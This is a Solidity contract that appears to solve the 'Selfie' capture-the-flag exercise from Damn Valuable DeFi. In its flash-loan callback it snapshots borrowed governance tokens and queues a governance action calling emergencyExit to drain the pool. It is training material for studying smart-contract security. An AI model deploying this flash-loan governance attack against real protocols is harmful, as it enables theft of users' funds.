// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SimpleGovernance.sol";
import "hardhat/console.sol";

contract SelfieAttacker {
    SelfiePool pool;
    SimpleGovernance dao;
    ERC20Snapshot public immutable token;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(SelfiePool _pool, SimpleGovernance _dao, ERC20Snapshot _token) {
        pool = _pool;
        dao = _dao;
        token = _token;
    }

    function onFlashLoan(address player, DamnValuableTokenSnapshot governanceToken, uint256 amount, uint fee, bytes calldata data) external payable returns (bytes32) {
        uint256 snapshotId = governanceToken.snapshot();
        governanceToken.balanceOfAt(address(this), snapshotId);
        bytes memory attackCallData = abi.encodeWithSignature("emergencyExit(address)", player);
        dao.queueAction(address(pool), 0, attackCallData);
        token.approve(msg.sender, amount);
       
        return CALLBACK_SUCCESS;
    }
}